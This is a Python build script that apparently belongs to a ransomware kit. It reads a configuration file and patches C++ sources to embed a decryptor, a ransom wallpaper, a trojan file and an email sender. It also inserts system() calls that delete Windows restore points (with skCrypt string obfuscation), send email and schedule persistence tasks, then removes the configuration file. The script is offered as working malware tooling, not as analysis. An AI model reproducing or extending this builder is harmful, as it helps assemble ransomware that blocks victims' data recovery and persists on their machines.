import os

for line_ in open('preCompilation.tmp', 'r').readlines():
    if line_.split('=')[0] == 'decryptor':
        decryptorText = line_.split('=')[1]
    if line_.split('=')[0] == 'wallpaper':
        wallpaperText = line_.split('=')[1]
    if line_.split('=')[0] == 'emailsender':
        emailSenderText = line_.split('=')[1]
    if line_.split('=')[0] == 'fileicon':
        fileIconText = line_.split('=')[1]
    if line_.split('=')[0] == 'customfile':
        customFileText = line_.split('=')[1]
    if line_.split('=')[0] == 'trojanfile':
        trojanFileText = line_.split('=')[1]
    if line_.split('=')[0] == 'deleteRestPo':
        deleteRestPoText = line_.split('=')[1]
    if line_.split('=')[0] == 'sendEmail':
        sendEmailText = line_.split('=')[1]
    if line_.split('=')[0] == 'task1':
        task1Text = line_.split('=')[1]
    if line_.split('=')[0] == 'task2':
        task2Text = line_.split('=')[1]


main_cppRead = open('main.cpp', 'r')
content = ""
inside = False

for line in main_cppRead.readlines():
    if inside:
        if line == ';\n':
            inside = False
        continue
    if line == 'string DataDecryptorContent = \n':
        inside = True
        content += 'string DataDecryptorContent = "' + decryptorText[:-1] + '";\n'
        continue
    if line == 'string WallpaperContent = \n':
        inside = True
        content += 'string WallpaperContent = "' + wallpaperText[:-1] + '";\n'
        continue
    if line == 'string EmailSenderContent = \n':
        inside = True
        content += 'string EmailSenderContent = "' + emailSenderText[:-1] + '";\n'
        continue
    if line == 'string FileIconContent = \n':
        inside = True
        content += 'string FileIconContent = "' + fileIconText[:-1] + '";\n'
        continue
    if line == 'string CustomFileContent = \n':
        inside = True
        content += 'string CustomFileContent = "' + customFileText[:-1] + '";\n'
        continue
    if line == 'string TrojanFileContent = \n':
        inside = True
        content += 'string TrojanFileContent = "' + trojanFileText[:-1] + '";\n'
        continue
    content += line

main_cppRead.close()

main_cppWrite = open('main.cpp', 'w')
main_cppWrite.write(content)
main_cppWrite.close()


security_cppRead = open('security.cpp', 'r')
content = ""
next = False

for line in security_cppRead.readlines():
    if next:
        content += f'\tsystem(skCrypt("{deleteRestPoText[:-1]}"));\n'
        next = False
        continue

    if line == 'void DeleteRestorePoints() {\n':
        next = True

    content += line

security_cppRead.close()

security_cppWrite = open('security.cpp', 'w')
security_cppWrite.write(content)
security_cppWrite.close()


sender_cppRead = open('sender.cpp', 'r')
content = ""
nextEmail = False
nextSchedule1 = False
nextSchedule2 = False

for line in sender_cppRead.readlines():
    if nextEmail:
        content += f'\tsystem("{sendEmailText[:-1]}");\n'
        nextEmail = False
        continue

    if nextSchedule1:
        content += f'\tsystem("{task1Text[:-1]}");\n'
        nextSchedule1 = False
        nextSchedule2 = True
        continue

    if nextSchedule2:
        content += f'\tsystem("{task2Text[:-1]}");\n'
        nextSchedule2 = False
        continue

    if line == 'void SendEmail() {\n':
        nextEmail = True
    if line == 'void ScheduleTask() {\n':
        nextSchedule1 = True

    content += line

sender_cppRead.close()

sender_cppWrite = open('sender.cpp', 'w')
sender_cppWrite.write(content)
sender_cppWrite.close()



os.remove('preCompilation.tmp')
